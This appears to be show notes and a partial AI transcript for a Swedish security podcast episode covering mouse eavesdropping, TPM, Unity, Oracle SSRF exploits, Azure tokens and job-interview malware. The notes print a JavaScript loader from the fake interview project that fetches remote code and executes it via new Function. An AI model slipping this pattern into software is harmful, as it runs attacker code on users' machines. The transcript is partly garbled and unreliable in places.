---
date: '2025-11-10T07:33:00'
tags:
- ostrukturerat
title: 'Säkerhetspodcasten #292 - Ostrukturerat V.46'
---
Mössen lyssnar,
Secret Service hittar SIM-kort,
TPM-diskussion,
Unity sårbarhet,
Oracle SSRF RCE,
Osignerade tokens till Azure Graph API,
Signal PQC Ratchet,
OSINT mot FSB,
Malware i din jobbintervju.

## Lyssna

* [mp3](https://traffic.libsyn.com/secure/sakerhetspodcasten/2025-11-05_Sakerhetspodcasten_v3.mp3?dest-id=117848), längd: 01:13:21

## Försnack

Rickard pratar om varför han varit borta ett tag.
Peter snackar om [Whisper](https://github.com/openai/whisper) transkriberingar.

## Mus avlyssnar dig

Möss med hög uppdateringsfrekvens kan avlyssna rum via sin fotosensor.

Länkar:
* [Mic-E-Mouse](https://sites.google.com/view/mic-e-mouse)
* [Invisible Ears at Your Fingertips: Acoustic Eavesdropping via Mouse Sensors](https://arxiv.org/pdf/2509.13581)
  `pdf`
  Mohamad Habib Fakih, Rahul Dharmaji, Youssef Mahmoud, Halima Bouzidi,
  Mohammad Abdullah Al Faruque, \
  Dept. of Electrical Engineering and Computer Science, University of California, Irvine, CA, USA
* [YouTube/ David Bombal: Optical Mouse Captures Speech. Study WARNING for Users Now](https://www.youtube.com/watch?v=FlkSo00UvmU) `video`

## Secret Sevice slår till mot SIM kort hot

Massa SIM-kort hittade i mystiska annordningar.

Länkar:
* [U.S. Secret Service dismantles imminent telecommunications threat in New York tristate area](https://www.secretservice.gov/newsroom/releases/2025/09/us-secret-service-dismantles-imminent-telecommunications-threat-new-york)

## Windows TPM

Rob Braxman har rantat om TPM och att Endorsment Key (EK) gör en spårbar.

TPM arkitekturen antar att man använder en privacy-preserving
  _Privacy/Attestation CA_ som man litar blint på.
Där man byter ut sin TPM/EK-identitet mot en privat/temporär
  identitet.

``` plain
+-----+ ------ ek_rsa.cert --->  +--------------+
|     | ------ ak_rsa.pub ---->  | Attestation  |
| T P | ------ ak_rsa.name --->  | Certificate  |
| R L |                          |  Authority   |
| U A | <---- credentials -----  |              |
| S T | <---- ak_cert.enc -----  +--------------+
| T F |
| E O | ( Decrypt AKCert using TPM.EKpriv / TPM2_ActivateCredential )
| D R |
|   M |
| M   |                           +--------------+
| O   | -------- ak_cert ------>  |    Remote    |
| D   | ------ tpm2_quote ----->  | Attestation  |
| U   |                           |    Server    |
| L   |                           +--------------+
| E   |
+-----+
```

Länkar:
* [YouTube/ Rob Braxman Tech: Your Windows 11 Computer’s Hidden Spy - The Dark Truth About TPM Chips](https://www.youtube.com/watch?v=t1eX_vvAlUc) `video`
* [github.com/blaufish/Tpm2AttestationCertificationAuthority](https://github.com/blaufish/Tpm2AttestationCertificationAuthority)
  _Test project for Attestation CA, previously referred to as Privacy CA._

## Unity: Massa spel sårbara mot LFI attack

Unity:

> En **osäker filinläsnings-** (_Unsafe file loading_)
> och **lokal filinkluderingsattack** (_local file inclusion attack_).

> Kan möjliggöra **lokal kodexekvering**
> och **åtkomst till konfidentiell information**
> på slutanvändarens enheter som kör applikationer byggda med Unity.

> Kodexekveringen skulle vara begränsad till den
> **sårbara applikationens privilegienivå**, och informationsläckan skulle
> vara begränsad till den information som är
> **tillgänglig för den sårbara applikationen**.


* [Unity: Security Update Advisory](https://unity.com/security/sept-2025-01)
* [CVE.org: CVE-2025-59489](https://www.cve.org/CVERecord?id=CVE-2025-59489)
* [YouTube/ Gamefromscratch: MASSIVE Unity Security Exploit Revealed](https://www.youtube.com/watch?v=toRGh5NVAbs) `video`

## Oracle E-bussiness RCE via SSRF sårbarheter

ransomware grupper läcker varandras exploits...

Och Google Threat Intelligence Group och Mandiant spårar dem.

`UiServlet` oautenticerad RCE via SSRF:
* `UiServlet` äter XML.
* XML `<param name="return_url">` säger vilken URL som `UiServlet` skall besöka (SSRF).
* URL returnerar OS-kommandon som `UiServlet` exekverar...
  [system()](https://man7.org/linux/man-pages/man3/system.3.html)

`SyncServlet` oautenticerad RCE via SSRF:
* `SyncServlet` kan referera till intern sida `TemplatePreviewPG`.
* `TemplatePreviewPG` exekerar parametern `TemplateType` som XSLT.
* XSLT schema
  `http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager` och
  `http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine`
  funktion `eval(..., ...)` exekverar arbiträr kod.

Länkar:
* [SentinelOne: Cl0P Ransomware - In-Depth Analysis, Detection, and Mitigation](https://www.sentinelone.com/anthology/clop/)
* [Google Cloud Blog/ Mandiant , Google Threat Intelligence Group : Oracle E-Business Suite Zero-Day Exploited in Widespread Extortion Campaign - A financially motivated actor conducting a large-scale extortion campaign under the CL0P brand by exploiting a zero-day vulnerability in Oracle E-Business Suite to steal customer data.](https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation)
* [BleepingComputer/ Lawrence Abrams: Oracle silently fixes zero-day exploit leaked by ShinyHunters - Oracle has silently fixed an Oracle E-Business Suite vulnerability (CVE-2025-61884) that was actively exploited to breach servers, with a proof-of-concept exploit publicly leaked by the ShinyHunters extortion group.](https://www.bleepingcomputer.com/news/security/oracle-silently-fixes-zero-day-exploit-leaked-by-shinyhunters/)
* [CVE.org: CVE-2025-61882](https://www.cve.org/CVERecord?id=CVE-2025-61882)
* [CVE.org: CVE-2025-61884](https://www.cve.org/CVERecord?id=CVE-2025-61884)
* [YouTube/ Low Level: this isn't great...](https://www.youtube.com/watch?v=iyPIR8pLksQ) `video`

## Microsoft Azure AD osignerade tokens till Graph API

Azure Graph API accepterade osignerade Service-To-Service tokens,
  vilket gjorde det möjligt att ta över miljöer (tenant/hyresvärd).

Länkar:
* [dirkjanm.io: One Token to rule them all - obtaining Global Admin in every Entra ID tenant via Actor tokens - While preparing for my Black Hat and DEF CON talks in July of this year, I found the most impactful Entra ID vulnerability that I will probably ever find. One that could have allowed me to compromise every Entra ID tenant in the world (except probably those in national cloud deployments). If you are an Entra ID admin reading this, yes that means complete access to your tenant. The vulnerability consisted of two components: undocumented impersonation tokens that Microsoft uses in their backend for service-to-service (S2S) communication, called “Actor tokens”, and a critical vulnerability in the (legacy) Azure AD Graph API that did not properly validate the originating tenant, allowing these tokens to be used for cross-tenant access.](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)
* [Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55241)
* [YouTube/ Daniel Boctor: ALL Microsoft Azure Tenants Compromised GLOBALLY!](https://www.youtube.com/watch?v=T3_3GNyzZV8) `video`

## Signal Post-Quantum kryptografiskt spärrhakeprotokoll

Signal Ratchet (Spärrhake) har börjat klicka frammåt på två sätt,
  ett av dem som är Post-Quantum Cryptography (PQC) säkrat.

Mattias försöker lära ut `RFC 9794`, korrekt PQC-terminologi.

Länkar:
* [Ars Technica/ Dan Goodin: Why Signal’s post-quantum makeover is an amazing engineering achievement - New design sets a high standard for post-quantum readiness.](https://arstechnica.com/security/2025/10/why-signals-post-quantum-makeover-is-an-amazing-engineering-achievement/)
* [Signal: The Double Ratchet Algorithm](https://signal.org/docs/specifications/doubleratchet/)
* [RFC 9794: Terminology for Post-Quantum Traditional Hybrid Schemes](https://www.rfc-editor.org/rfc/rfc9794.html)

## OSINT spaning på FSB

FSB spåras via foton på deras emblem m.m.

Open-source intelligence (OSINT)
 eller öppensåsspaning som vi säger på svenska...

Länkar:
* [CheckFirst: Unveiling FSB’s 16 th Center SIGINT Capabilities](https://checkfirst.network/wp-content/uploads/2025/07/OSINT_Phaleristics_Unveiling_FSB_16th_Center_SIGINT_Capabilities.pdf) `pdf`
* [Covert Access Team/ Brian Harris: Reading the Badges - How OSINT Mapped the FSB’s 16th Center](https://covertaccessteam.substack.com/p/reading-the-badges-how-osint-mapped)

## Malware i NodeJS projekt på din jobintervju

Obfuskerat malware i Node JS projekt man får från "företag"
som vill hålla en "teknisk anställningsintervju" med dig.

Hämtar externt javascript från obfuskerad URL.
Kör den på ett sätt som är lite mer dolt än `eval()`.

Cursor AI agent blir misstänksam:

> "Innan jag kör den här applikationen, kan du se om det finns någon
>   **misstänkt kod** i denna kodbas?
> Till exempel kod som läser filer den inte borde läsa, kod som försöker
>   komma åt **kryptoplånböcker** (crypto wallets) eller liknande.

`server/controllers/userController.js`:

``` javascript
(async () => {
    const byteArray = [
        // byte-array obfuskerad URL
    ];
    const uint8Array = new Uint8Array(byteArray);
    const decoder = new TextDecoder('utf-8');
    // hämta extern javascript funktion "model"
    // namnge den "require"
    // kör "require"
    axios.get(decoder.decode(uint8Array))
        .then(response => {
            new Function("require", response.data.model)(require);
        })
        .catch(error => { });
})();
```

Länkar:
* [David Dodda: How I Almost Got Hacked By A 'Job Interview'](https://blog.daviddodda.com/how-i-almost-got-hacked-by-a-job-interview)


## AI transkribering

_AI försöker förstå oss... Ha överseende med galna feltranskriberingar._

`1 00:00:00,000 --> 00:00:02,960`
Hej och välkommen till Säkerhetspodcasten



`2 00:00:02,960 --> 00:00:04,240`
Jag som pratar heter Johan Ryberg



`3 00:00:04,240 --> 00:00:05,760`
Med mig har jag Jesper Larsson



`4 00:00:05,760 --> 00:00:07,320`
Mattias Vidager



`5 00:00:07,320 --> 00:00:08,900`
Rickard Bortfors



`6 00:00:08,900 --> 00:00:11,060`
Peter Magnusson



`7 00:00:11,060 --> 00:00:12,620`
Stavfelet i din uppsats



`8 00:00:12,620 --> 00:00:15,720`
Vi ska nämna att det är onsdag den 5 november



`9 00:00:15,720 --> 00:00:17,260`
När vi spelar in det här



`10 00:00:17,260 --> 00:00:19,580`
Vi är sponsrade av



`11 00:00:19,580 --> 00:00:19,860`
Short



`12 00:00:19,860 --> 00:00:21,540`
Så även av



`13 00:00:21,540 --> 00:00:24,920`
Bortfors Consulting



`14 00:00:24,920 --> 00:00:26,200`
Snart bara Consulting



`15 00:00:26,200 --> 00:00:27,780`
Bortfors



`16 00:00:27,780 --> 00:00:29,760`
Det finns på bortfors.se



`17 00:00:29,760 --> 00:00:30,480`
Stämmer bra det



`18 00:00:30,480 --> 00:00:32,380`
Det är två S



`19 00:00:32,380 --> 00:00:35,260`
Det är ett ostuktigt avsnitt



`20 00:00:35,260 --> 00:00:36,240`
Och vi är fulltaliga



`21 00:00:36,240 --> 00:00:38,080`
Det är härligt



`22 00:00:38,080 --> 00:00:41,260`
Även jag



`23 00:00:41,260 --> 00:00:42,900`
Jag har varit lite



`24 00:00:42,900 --> 00:00:45,420`
Offline de senaste



`25 00:00:45,420 --> 00:00:46,840`
Veckorna



`26 00:00:46,840 --> 00:00:48,540`
Drygt en och en halv månad



`27 00:00:48,540 --> 00:00:51,780`
Så jag tänkte berätta lite



`28 00:00:51,780 --> 00:00:52,280`
Varför



`29 00:00:52,280 --> 00:00:55,160`
Varför jag inte har varit så



`30 00:00:55,160 --> 00:00:57,320`
Synlig och aktiv



`31 00:00:57,320 --> 00:00:59,320`
I september



`32 00:00:59,320 --> 00:01:00,680`
Så fick jag ett cancerbesked



`33 00:01:00,680 --> 00:01:03,740`
Och ägnade oktober



`34 00:01:03,740 --> 00:01:04,480`
Åt att



`35 00:01:04,480 --> 00:01:07,140`
Operera bort en bröstcancer



`36 00:01:07,140 --> 00:01:08,300`
Det är ju bröstcancer månaden



`37 00:01:08,300 --> 00:01:09,120`
Så det var väl fint



`38 00:01:09,120 --> 00:01:13,700`
Ja men operationen har gått jättebra



`39 00:01:13,700 --> 00:01:15,300`
Sen vet jag inte alls



`40 00:01:15,300 --> 00:01:16,100`
Vad de tänker hitta på



`41 00:01:16,100 --> 00:01:17,160`
Jag ska till läkaren imorgon



`42 00:01:17,160 --> 00:01:19,380`
Och är fortfarande formellt sjukskriven



`43 00:01:19,380 --> 00:01:20,080`
Så att



`44 00:01:20,080 --> 00:01:23,940`
På gång tillbaka



`45 00:01:23,940 --> 00:01:25,880`
Men behandlingen kan ju dra ut på tiden



`46 00:01:25,880 --> 00:01:27,220`
Så att oklart



`47 00:01:27,220 --> 00:01:28,480`
Om tillgänglighet



`48 00:01:28,480 --> 00:01:29,100`
Och sådär



`49 00:01:29,100 --> 00:01:31,980`
Men de flesta



`50 00:01:31,980 --> 00:01:34,020`
Företaget funkar skitbra



`51 00:01:34,020 --> 00:01:34,460`
Utan mig



`52 00:01:34,460 --> 00:01:35,160`
Jag är glädjande



`53 00:01:35,160 --> 00:01:37,180`
Det är jobbigt



`54 00:01:37,180 --> 00:01:39,980`
Så man är inte så oombärlig



`55 00:01:39,980 --> 00:01:40,580`
Som man tror



`56 00:01:40,580 --> 00:01:41,260`
Och det är väl bra



`57 00:01:41,260 --> 00:01:43,220`
Men vi har jobbat mycket med



`58 00:01:43,220 --> 00:01:45,160`
Kontinuitetsplanering



`59 00:01:45,160 --> 00:01:46,900`
Och att dela upp arbetsuppgifter



`60 00:01:46,900 --> 00:01:48,980`
Så att det har rullat på väldigt bra



`61 00:01:48,980 --> 00:01:50,580`
Trots att jag inte har varit så



`62 00:01:50,580 --> 00:01:52,560`
Aktiv och online



`63 00:01:52,560 --> 00:01:55,200`
Och den bakgrunden gör ju att det är



`64 00:01:55,200 --> 00:01:56,380`
Ännu roligare att vara fem här



`65 00:01:56,380 --> 00:01:56,780`
Ja



`66 00:01:56,780 --> 00:01:59,520`
Trots att jag inte har någon hörlöv där



`67 00:01:59,520 --> 00:02:00,840`
Men jag är okej med det



`68 00:02:00,840 --> 00:02:03,520`
Men så blir det när man köper en anläggning



`69 00:02:03,520 --> 00:02:04,940`
Som bara har fyra hörlövsuttag



`70 00:02:04,940 --> 00:02:06,140`
Ja det är jättekonstigt



`71 00:02:06,140 --> 00:02:09,100`
Jesper är mobbad på sin egen arbetsplats



`72 00:02:09,100 --> 00:02:11,180`
På sin egen inspelningsutrustning



`73 00:02:11,180 --> 00:02:12,840`
Det är det man får i lotten i livet



`74 00:02:12,840 --> 00:02:14,780`
Väldigt skönt att ha dig tillbaka



`75 00:02:14,780 --> 00:02:15,680`
Ja det är det verkligen



`76 00:02:15,680 --> 00:02:19,080`
Jag har ju känt väldigt mycket



`77 00:02:19,080 --> 00:02:20,280`
För cancerfonden



`78 00:02:20,280 --> 00:02:23,300`
Och brukar alltid sponsra



`79 00:02:23,300 --> 00:02:24,280`
Rosa bandet och sådär



`80 00:02:24,280 --> 00:02:26,540`
I år så var det extra



`81 00:02:26,540 --> 00:02:27,200`
Angeläget



`82 00:02:27,200 --> 00:02:28,240`
Inte för att det hjälper mig



`83 00:02:28,240 --> 00:02:30,140`
Men jag är väldigt tacksam för de åren



`84 00:02:30,140 --> 00:02:33,920`
Av forskning som har lett fram till



`85 00:02:33,920 --> 00:02:35,900`
Den cancervård vi har idag



`86 00:02:35,900 --> 00:02:37,500`
För det är ju



`87 00:02:37,500 --> 00:02:40,380`
För 30 år sedan så var det 50-50



`88 00:02:40,380 --> 00:02:41,120`
Som strök med



`89 00:02:41,120 --> 00:02:43,260`
Idag är det liksom 90-10



`90 00:02:43,260 --> 00:02:44,940`
Som överlever



`91 00:02:44,940 --> 00:02:47,920`
Man kan väl säga ifall ni har njutit



`92 00:02:47,920 --> 00:02:50,580`
Av de här 300 snart plus timmarna



`93 00:02:50,580 --> 00:02:51,720`
Av gratis content



`94 00:02:51,720 --> 00:02:53,260`
Och vill göra något fint



`95 00:02:53,260 --> 00:02:55,260`
Så skänk en slant till cancerfonden



`96 00:02:55,260 --> 00:02:56,140`
Ja det tycker jag



`97 00:02:56,540 --> 00:02:57,860`
Om man



`98 00:02:57,860 --> 00:03:00,420`
Nu ska jag inte bäsa



`99 00:03:00,420 --> 00:03:02,120`
För du är ju faktiskt inne i Movember



`100 00:03:02,120 --> 00:03:04,340`
Så egentligen borde man ju sitta här



`101 00:03:04,340 --> 00:03:06,720`
Med en liten tangorabatt på överläppen



`102 00:03:06,720 --> 00:03:07,980`
Istället för ett go-ti



`103 00:03:07,980 --> 00:03:10,140`
Men nu är det ju då



`104 00:03:10,140 --> 00:03:12,540`
Prostatacancer som är i fokus



`105 00:03:12,540 --> 00:03:14,780`
Och där kan man väl säga



`106 00:03:14,780 --> 00:03:15,140`
Att



`107 00:03:15,140 --> 00:03:18,580`
Där har ju screeningen kommit långt



`108 00:03:18,580 --> 00:03:19,160`
Och



`109 00:03:19,160 --> 00:03:22,420`
Jag var och gjorde ett PSA-test i maj



`110 00:03:22,420 --> 00:03:24,420`
Och tänkte gött då har man inte cancer



`111 00:03:24,420 --> 00:03:25,980`
Nej för jag hade bröstcancer



`112 00:03:26,540 --> 00:03:28,580`
Och det kan



`113 00:03:28,580 --> 00:03:30,980`
Det kan också vara bra att veta om det



`114 00:03:30,980 --> 00:03:32,240`
Att det kan även hända män



`115 00:03:32,240 --> 00:03:34,780`
Så glöm inte bort att kläm på era tutta



`116 00:03:34,780 --> 00:03:35,480`
Check your lamps



`117 00:03:35,480 --> 00:03:38,140`
Your lovely lady



`118 00:03:38,140 --> 00:03:41,760`
Sättet jag upptäckte den på



`119 00:03:41,760 --> 00:03:44,540`
Var ju att jag hade på mig en fallskyddsele



`120 00:03:44,540 --> 00:03:46,460`
När jag var uppe och skruvade upp snörasskydd



`121 00:03:46,460 --> 00:03:47,500`
På stugan



`122 00:03:47,500 --> 00:03:48,200`
Som man gör



`123 00:03:48,200 --> 00:03:49,960`
Ja det gör man



`124 00:03:49,960 --> 00:03:52,360`
Men för att man ska få komma upp på taket



`125 00:03:52,360 --> 00:03:54,980`
Så kräver frun att man ska ha en fallskyddsele



`126 00:03:54,980 --> 00:03:56,180`
Och ja



`127 00:03:56,540 --> 00:03:58,420`
Gick och svor över den där selen



`128 00:03:58,420 --> 00:04:00,180`
För den nöp mig i bröstet hela tiden



`129 00:04:00,180 --> 00:04:00,620`
Tyckte jag



`130 00:04:00,620 --> 00:04:02,940`
Jävla skitsele liksom



`131 00:04:02,940 --> 00:04:03,660`
Fan



`132 00:04:03,660 --> 00:04:05,160`
Och så ska man behöva



`133 00:04:05,160 --> 00:04:06,500`
Gruff, gruff, gruff



`134 00:04:06,500 --> 00:04:08,220`
Och så när jag kom ner så insåg jag



`135 00:04:08,220 --> 00:04:09,880`
Det var inte selen



`136 00:04:09,880 --> 00:04:10,520`
Det var fel på



`137 00:04:10,520 --> 00:04:11,360`
Det var något annat



`138 00:04:11,360 --> 00:04:14,680`
Så att den kan ju ha räddat livet på mig



`139 00:04:14,680 --> 00:04:16,300`
Fast inte på det sätt det var tänkt



`140 00:04:16,300 --> 00:04:17,620`
Dual use



`141 00:04:17,620 --> 00:04:18,380`
Dual use



`142 00:04:18,380 --> 00:04:18,780`
Precis



`143 00:04:18,780 --> 00:04:21,560`
Även känna efter klumpar i bröstet



`144 00:04:21,560 --> 00:04:22,880`
Men det behöver du bara känna



`145 00:04:22,880 --> 00:04:24,000`
Nu har du bara en chipsute



`146 00:04:24,000 --> 00:04:24,820`
Exakt



`147 00:04:24,820 --> 00:04:25,440`
Så nu är det



`148 00:04:25,440 --> 00:04:25,980`
Det är ju



`149 00:04:25,980 --> 00:04:26,540`
Det är bra



`150 00:04:26,540 --> 00:04:27,160`
Det är bra men det är dåligt



`151 00:04:27,160 --> 00:04:27,560`
Precis



`152 00:04:27,560 --> 00:04:28,440`
Så jag har gjort



`153 00:04:28,440 --> 00:04:32,980`
En ensidig toppsurgery här nu



`154 00:04:32,980 --> 00:04:33,820`
Och



`155 00:04:33,820 --> 00:04:36,900`
Väldigt fin shape



`156 00:04:36,900 --> 00:04:38,380`
På den bröstmuskeln just nu



`157 00:04:38,380 --> 00:04:40,560`
Vi pratade lite om det



`158 00:04:40,560 --> 00:04:43,340`
När ni inte får lyssna i podcast



`159 00:04:43,340 --> 00:04:44,360`
Men jag måste dela det



`160 00:04:44,360 --> 00:04:45,580`
Man har ju möjligheten till



`161 00:04:45,580 --> 00:04:47,860`
Plastikkirurgi nu



`162 00:04:47,860 --> 00:04:49,160`
Rekonstruktiv plastikkirurgi



`163 00:04:49,160 --> 00:04:50,620`
Och då har vi sagt att man ska ju då



`164 00:04:50,620 --> 00:04:51,320`
I den här



`165 00:04:51,320 --> 00:04:52,720`
Fagra konsultkroppen



`166 00:04:52,720 --> 00:04:55,360`
Ha en supermuskulös



`167 00:04:55,360 --> 00:04:56,500`
Fake tutt



`168 00:04:56,540 --> 00:04:58,200`
Eller hur



`169 00:04:58,200 --> 00:04:59,960`
Och så chips tutt på andra sidan



`170 00:04:59,960 --> 00:05:01,920`
Det piggar ju upp



`171 00:05:01,920 --> 00:05:02,960`
Så det beror ju på lite såhär



`172 00:05:02,960 --> 00:05:03,460`
Vilken



`173 00:05:03,460 --> 00:05:05,000`
Vilken sida man vill visa upp



`174 00:05:05,000 --> 00:05:06,060`
Och vänster blir det i det här fallet



`175 00:05:06,060 --> 00:05:06,260`
Precis



`176 00:05:06,260 --> 00:05:08,960`
Jag fick information om att jag kunde få hjälp



`177 00:05:08,960 --> 00:05:09,940`
Att välja ut



`178 00:05:09,940 --> 00:05:10,820`
En tutte



`179 00:05:10,820 --> 00:05:11,160`
Nej



`180 00:05:11,160 --> 00:05:12,260`
Ja dels det



`181 00:05:12,260 --> 00:05:12,660`
Men



`182 00:05:12,660 --> 00:05:13,920`
Men också



`183 00:05:13,920 --> 00:05:16,260`
En bikini



`184 00:05:16,260 --> 00:05:18,180`
Och bikini bh och sånt där



`185 00:05:18,180 --> 00:05:19,600`
Så att jag funderar på om jag ska



`186 00:05:19,600 --> 00:05:22,620`
Genusgrejerna har kommit långt



`187 00:05:22,620 --> 00:05:23,740`
Ja utnyttja



`188 00:05:23,740 --> 00:05:26,320`
Västra Götalandsregionen skattepengar till



`189 00:05:26,320 --> 00:05:28,620`
Grejer som jag inte trodde jag skulle höra idag



`190 00:05:28,620 --> 00:05:29,640`
Men



`191 00:05:29,640 --> 00:05:31,080`
Jag gillar det



`192 00:05:31,080 --> 00:05:32,460`
Klart som fan vi ska ha en bh



`193 00:05:32,460 --> 00:05:35,220`
Men det här var under temat fysisk säkerhet



`194 00:05:35,220 --> 00:05:35,760`
Kan man väl säga



`195 00:05:35,760 --> 00:05:36,760`
Ja exakt



`196 00:05:36,760 --> 00:05:38,720`
Så fallskyddseler är bra



`197 00:05:38,720 --> 00:05:40,000`
Klättra på tak



`198 00:05:40,000 --> 00:05:41,320`
Det kan rädda liv



`199 00:05:41,320 --> 00:05:41,640`
Det kan



`200 00:05:41,640 --> 00:05:42,200`
Det kan



`201 00:05:42,200 --> 00:05:44,460`
Det var också oväntat



`202 00:05:44,460 --> 00:05:44,960`
Ja



`203 00:05:44,960 --> 00:05:46,660`
Ja



`204 00:05:46,660 --> 00:05:47,740`
Det är här ni hörde



`205 00:05:47,740 --> 00:05:48,880`
Precis



`206 00:05:48,880 --> 00:05:50,860`
Ni kommer bara bli sämre från och med nu



`207 00:05:50,860 --> 00:05:51,720`
Så håll i er



`208 00:05:51,720 --> 00:05:52,280`
Så är det



`209 00:05:52,280 --> 00:05:54,300`
Men då vet ni vad jag har sysslat med ett tag



`210 00:05:54,300 --> 00:05:55,940`
Härligt



`211 00:05:55,940 --> 00:05:57,100`
Eller ja inte så härligt



`212 00:05:57,100 --> 00:05:58,000`
Men härligt att du är tillbaka



`213 00:05:58,000 --> 00:05:58,800`
Ja verkligen



`214 00:05:58,800 --> 00:06:01,780`
Peter du vill prata om Tranberg



`215 00:06:01,780 --> 00:06:04,980`
Det här har blivit fokus på den här podden



`216 00:06:04,980 --> 00:06:08,820`
Johan mobbar min hans



`217 00:06:08,820 --> 00:06:09,400`
Ja nu är jag med



`218 00:06:09,400 --> 00:06:12,840`
Det roliga är att det är roligare än så



`219 00:06:12,840 --> 00:06:13,400`
Ja okej



`220 00:06:13,400 --> 00:06:16,800`
Säkerhetspodcasten har numera



`221 00:06:16,800 --> 00:06:18,300`
Massa transkriberingar



`222 00:06:18,300 --> 00:06:20,080`
Transkribering står det på tavlan



`223 00:06:20,080 --> 00:06:20,840`
Är du med



`224 00:06:20,840 --> 00:06:22,620`
Transkribering Tranberg



`225 00:06:22,620 --> 00:06:23,880`
Du såg fel



`226 00:06:23,880 --> 00:06:25,620`
Man kan ju säga att våran transkribering



`227 00:06:25,940 --> 00:06:27,200`
Inte är flålös heller



`228 00:06:27,200 --> 00:06:29,600`
Det har nämligen



`229 00:06:29,600 --> 00:06:32,840`
Stått och mullrat i mitt hem



`230 00:06:32,840 --> 00:06:35,660`
Typ i



`231 00:06:35,660 --> 00:06:37,720`
Jag minns inte om det var 30 eller 40 timmar



`232 00:06:37,720 --> 00:06:38,380`
Den bara



`233 00:06:38,380 --> 00:06:40,740`
Jag måste väl också få säga så här



`234 00:06:40,740 --> 00:06:43,360`
Peter har ju valt att inte arbeta längre



`235 00:06:43,360 --> 00:06:44,700`
Ingen vet när han ska börja jobba igen



`236 00:06:44,700 --> 00:06:46,000`
Men det som har hänt



`237 00:06:46,000 --> 00:06:47,180`
Det är att den här podcasten



`238 00:06:47,180 --> 00:06:48,420`
Har aldrig varit så uppstyrd



`239 00:06:48,420 --> 00:06:49,520`
Någonsin



`240 00:06:49,520 --> 00:06:51,220`
Nu står det och mullrar lite varstans



`241 00:06:51,220 --> 00:06:52,460`
Det händer så mycket grejer



`242 00:06:52,460 --> 00:06:53,460`
Det är show notes



`243 00:06:53,460 --> 00:06:55,900`
Det byggs en jäkla massa



`244 00:06:55,900 --> 00:06:58,160`
Grejer i våra github-prylar



`245 00:06:58,160 --> 00:06:59,820`
Och Peter



`246 00:06:59,820 --> 00:07:02,060`
Han jobbar med vår podcast nu



`247 00:07:02,060 --> 00:07:03,620`
Och det är väldigt bra för er som lyssnar



`248 00:07:03,620 --> 00:07:04,500`
För han styr upp



`249 00:07:04,500 --> 00:07:05,460`
Med



`250 00:07:05,460 --> 00:07:09,080`
Med ett RTX 5090 bland annat



`251 00:07:09,080 --> 00:07:11,360`
Berätta vad som har hänt



`252 00:07:11,360 --> 00:07:13,420`
Vi har kört Open Whisper



`253 00:07:13,420 --> 00:07:14,160`
Först så



`254 00:07:14,160 --> 00:07:17,360`
Vi byggde en liten



`255 00:07:17,360 --> 00:07:19,060`
Vrappe runt Open Whisper



`256 00:07:19,060 --> 00:07:21,480`
Vi mullrade igenom



`257 00:07:21,480 --> 00:07:22,600`
Alla gamla avsnitt



`258 00:07:22,600 --> 00:07:24,420`
Laddade hem våra MP3-or



`259 00:07:24,420 --> 00:07:27,200`
Körde Open Whisper på dem



`260 00:07:27,200 --> 00:07:30,160`
Uppdaterade våra Markdown-sidor



`261 00:07:30,160 --> 00:07:31,280`
Och



`262 00:07:31,280 --> 00:07:33,480`
Och med vi då



`263 00:07:33,480 --> 00:07:34,080`
Så är det alltså



`264 00:07:34,080 --> 00:07:35,440`
Ingen annan än Peter



`265 00:07:35,440 --> 00:07:37,580`
Peter och hans 5090



`266 00:07:37,580 --> 00:07:38,240`
Exakt



`267 00:07:38,240 --> 00:07:40,000`
Och hans allt i regon



`268 00:07:40,000 --> 00:07:41,940`
Och sen för enhetligt still



`269 00:07:41,940 --> 00:07:42,460`
Så



`270 00:07:42,460 --> 00:07:44,580`
Kastade jag ut



`271 00:07:44,580 --> 00:07:45,900`
Alla gamla



`272 00:07:45,900 --> 00:07:47,380`
Google-oj



`273 00:07:47,380 --> 00:07:48,880`
Transkriberingar



`274 00:07:48,880 --> 00:07:49,180`
Och



`275 00:07:49,180 --> 00:07:51,060`
Hittade en bok



`276 00:07:51,060 --> 00:07:54,040`
Ja vi kanske kan skita i det här



`277 00:07:54,040 --> 00:07:54,380`
För det kommer att vara



`278 00:07:54,380 --> 00:07:55,120`
Hela avsnittet



`279 00:07:55,120 --> 00:07:56,380`
Vi låter det vara osagt



`280 00:07:56,380 --> 00:07:57,640`
Vi hittade inte en bok



`281 00:07:57,640 --> 00:07:58,840`
Något



`282 00:07:58,840 --> 00:08:01,480`
Något



`283 00:08:01,480 --> 00:08:02,140`
Bårdelarn



`284 00:08:02,140 --> 00:08:04,060`
Onförklarligt inträffade



`285 00:08:04,060 --> 00:08:06,940`
Det brukar aldrig vara en bra start



`286 00:08:06,940 --> 00:08:08,620`
Men ja



`287 00:08:08,620 --> 00:08:11,480`
Det finns nog läge att återkomma till detta



`288 00:08:11,480 --> 00:08:13,840`
Men om du tillfälligt upplevde



`289 00:08:13,840 --> 00:08:15,260`
Att det var väldigt märkligt



`290 00:08:15,260 --> 00:08:16,440`
På våran sida



`291 00:08:16,440 --> 00:08:18,180`
Var du inte ensam?



`292 00:08:18,200 --> 00:08:19,920`
Vi har inte heller riktigt förstått det



`293 00:08:19,920 --> 00:08:22,020`
Jag har ändå försökt fel söka



`294 00:08:22,020 --> 00:08:23,540`
Det var någon som mullrade lite för mycket



`295 00:08:23,540 --> 00:08:24,340`
Men det gör det inte



`296 00:08:24,340 --> 00:08:24,360`
Men det gör det inte



`297 00:08:24,360 --> 00:08:26,260`
Jag undrar hur stor del



`298 00:08:26,260 --> 00:08:27,300`
Av våra lyssnare



`299 00:08:27,300 --> 00:08:28,680`
Som överhuvudtaget



`300 00:08:28,680 --> 00:08:29,520`
Vet att vi



`301 00:08:29,520 --> 00:08:31,300`
Har någonting på våran hemsida



`302 00:08:31,300 --> 00:08:32,720`
Nej men nu vet de det



`303 00:08:32,720 --> 00:08:33,400`
Nu vet de det



`304 00:08:33,400 --> 00:08:35,060`
Vi har ju jättefina show notes



`305 00:08:35,060 --> 00:08:36,540`
Med alla länkar och sånt



`306 00:08:36,540 --> 00:08:38,140`
Som vi diskuterar



`307 00:08:38,140 --> 00:08:38,920`
Det hade vi inte förut



`308 00:08:38,920 --> 00:08:39,400`
Det har vi nu



`309 00:08:39,400 --> 00:08:40,360`
Vi har ju dessutom



`310 00:08:40,360 --> 00:08:42,140`
